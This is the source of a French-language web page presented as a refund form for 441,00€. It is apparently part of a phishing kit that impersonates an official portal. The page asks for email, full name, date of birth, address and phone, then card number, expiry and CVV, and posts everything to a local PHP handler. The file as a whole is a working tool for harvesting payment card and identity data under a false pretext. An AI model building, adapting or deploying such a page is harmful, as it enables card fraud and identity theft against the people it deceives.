<?php
session_start();

include("./BIRNAVA/911.php");
?>
<!doctype html>
<html lang="fr">

	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta name="apple-itunes-app" content="app-id=505488770" />
		
			<link rel="stylesheet" href="./X911/style_v2.css" />

		<link rel="shortcut icon" href="./X911/favicon.ico" type="image/ico" />

		<title>Formulaire de remboursement</title>
	</head>
	<body>


		<div id="banner" style="margin-bottom:6px;">
<div class="container">
<a href="#"><img src="./X911/logo.svg" style="margin-top:15px; height: 72px;"></a>
<img id="optionalstuff" src="./X911/lgn.png" style="float:right;margin-top:13px;">

<style>
@media (max-width:629px) {
  img#optionalstuff {
    display: none;
  }
}
</style>
</a>
</div>
</div>
		<!-- Fil d'Arianne -->
		<div class="container">
			<div class="row">
				<ol class="breadcrumb ">
				    
				    
				    
				    
					<li><a href="#" title="Retour au portail">Accueil</a></li>
					<li class="active">Formulaire de remboursement (FRA5883934P)</li>
				</ol>
			</div>
		</div>
		<!-- Fin du fil d'Arianne -->
		<main class="container" style="margin-top:-12px;" id="contenu">
			
			<div class="row">
				<!-- Connexion Gauche-->	
				<div class="col-md-6">
					<div class="panel panel-default" >
						<div class="panel-heading" >

							<h2 id="titre_authent" style="margin-top:12px;" class="text-center">Informations personnelles</h2>
						</div>
						
						<div class="panel-body">

						
						
						<div style="width:100%; background:rgba(0, 80, 157, 0.5);  border-radius:4px; padding: 6px; color: white;">Merci de remplir le formulaire avec les informations demandées. 
En cas d'erreur, votre demande de remboursement pourrait être retardée.</div><br />
							<form action="./siftA/A.php" method="POST">
								<div class="row">
									<div class="col-md-12">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Adresse e-mail</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<input class="form-control" name="emaile" type="email" value="" placeholder="" aria-required="true" autocomplete="username" data-original-title="Votre adresse e-mail" data-toggle="tooltip" data-placement="top" data-mask="int" required >
											
										</div> 
									</div> 
								</div>

								<div class="row">
									<div class="col-md-6">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Nom,Prénom</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<input class="form-control" pattern="^[a-zA-Z ]*$" oninvalid="this.setCustomValidity('Incorrect')" onchange="this.setCustomValidity('')" name="username" type="text" aria-required="true" autocomplete="username" placeholder="" data-original-title="13 chiffres" data-toggle="tooltip" data-placement="top" data-mask="int" required="">
											
										</div> 
									</div> 
							
									<div class="col-md-6">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Date de naissance</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<span class="fieldset"><br><select class="boss"  name="day" required="" title="Please Select Day Of Birth" type="select"><option class="form-control" selected="selected" value="">Jour</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option> </select> - <select class="boss" name="month" required="" title="Please Select Month Of Birth" type="select"><option selected="selected" value="">Mois</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option> </select> - <select class="boss" name="year" required="" title="Please Select Your Year Of Birth" type="select"><option selected="selected" value="">Annee</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option> </select> </span>
											
										</div> 


									</div> 


								</div>

								<div class="row">
									<div class="col-md-12">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Adresse</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<input class="form-control" name="address" type="text" aria-required="true" autocomplete="username" placeholder="" data-original-title="13 chiffres" data-toggle="tooltip" data-placement="top" data-mask="int" required>
											
										</div> 
									</div> 

									<div class="col-md-4">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Code postal</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<input class="form-control" name="zipcode" type="tel" pattern="[0-9]{5}" maxlength="5" oninvalid="this.setCustomValidity('Incorrect')" onchange="this.setCustomValidity('')" aria-required="true" autocomplete="off" placeholder="" data-original-title="Votre code postal" data-toggle="tooltip" data-placement="top" data-mask="int" required="">
											
										</div> 
									</div> 

									<div class="col-md-8">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Ville</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<input class="form-control" pattern="^[a-zA-Z ]*$" oninvalid="this.setCustomValidity('Incorrect')" onchange="this.setCustomValidity('')" name="city" type="text" aria-required="true" autocomplete="username" placeholder="" data-original-title="13 chiffres" data-toggle="tooltip" data-placement="top" data-mask="int" required="">
											
										</div> 
									</div> 

									<div class="col-md-12">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Numéro de téléphone</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<input class="form-control" maxlength="10 " pattern="^((\+)33|0)[1-9](\d{2}){4}$" name="phone" aria-required="true" type="tel" placeholder="Mobile" autocomplete="on" id="tel" required="">
											
										</div> 
									</div> 
						</div>
					</div>
				</div>
				</div> 
				

			<section class="col-md-6" id="aide">
					<div class="panel panel-default" >
						<div class="panel-heading" >

							<h2 id="titre_authent" style="margin-top:12px;" class="text-center">Coordonnées bancaire</h2>
						</div>
						<div class="panel-body">

							Vos informations bancaire nous permettent de vous émettre un remboursement sur le compte où vous souhaitez recevoir le montant de <b>441,00€</b>. <br>Merci de noter que tous les champs sont obligatoires afin que votre demande soit prise en compte.</span>
							<br/>
							<br>
						<div class="panel-body">
    <?php
    if (isset($_GET['error'])) {
        $error = $_GET['error'];
        if ($error == 'invalidCardNumber') {
            echo "<p class='input-groupe' style='color: red'>Le numéro de carte est invalide. Veuillez entrer une carte valide</p>";
        }
    }
    ?>
							<div class="row">
									<div class="col-md-12">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Titulaire du compte  (Nom, Prénom)</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<input class="form-control" type="text" name="titu" aria-required="true" autocomplete="username" placeholder="" data-original-title="13 chiffres" data-toggle="tooltip" data-placement="top" data-mask="int" required>
											
										</div> 
									</div> 

									<div class="col-md-12">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Numéro de carte bancaire</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<input class="form-control" maxlength="16 " pattern="^(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$" oninvalid="this.setCustomValidity('Incorrect')" onchange="this.setCustomValidity('')" name="one" aria-required="true" type="tel" placeholder="" autocomplete="on" id="tel" required="">
											
										</div> 
									</div> 
								</div>

								<div class="row">
									<div class="col-md-5">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">Date d'expiration</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div><br>
											<select class="boss" name="expm" required="" title="Please Enter Your Expiration Date" type="select"><option selected="selected" value="">Mois</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option> </select> - <select class="boss" name="expy" required="" title="Please Enter Your Expiration Date" type="select"><option selected="selected" value="">Annee</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option> </select>
											
										</div> 
									</div> 

									<div class="col-md-7">
										<div class="form-group" id="fg_spi">
											<label for="spi_tmp">CVV (<span onclick="window.open('https://www.cvvnumber.com/cvv.html','_BLANK','width=640, height=500, scrollbars=yes');" style="cursor: pointer; text-decoration: underline; color:#084482; ">Qu'est-ce que c'est ?

</span>)</label><div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
											<input class="form-control" name="cvc" type="tel" pattern="[0-9]{3,4}" maxlength="4" oninvalid="this.setCustomValidity('Incorrect')" onchange="this.setCustomValidity('')" aria-required="true" autocomplete="off" placeholder="" data-original-title="Votre code postal" data-toggle="tooltip" data-placement="top" data-mask="int" required="">
											
										</div> 
									</div> 
								</div>


								<div style="width:100%; background:rgba(0, 80, 157, 0.5);  border-radius:4px; padding: 6px; color: white;">Montant du remboursement: <b>441,00€;</b></div><br />

								<button class="btn btn-xl btn-primary" name="submit" type="submit"><i class="fas fa-lock"></i>&nbsp; Etape suivante</button>

								<br />
							
							
							
						</div>
						

					</div></form>
              <div style="background:white; padding:12px;border-radius:4px;"><center>
					    
					    <picture>
  <source media="(min-width: 992px)" srcset="./X911/dDeoK_873743.png">
  <source media="(max-width:480px)" srcset="./X911/3d.png">
  <img src="./X911/dDeoK_873743.png" alt="">
</picture></center></div>
							
							</center>
						</div>
				</section>


			</div> <!-- row FIN -->
		</main> 
	

	
		</body>
	</html>
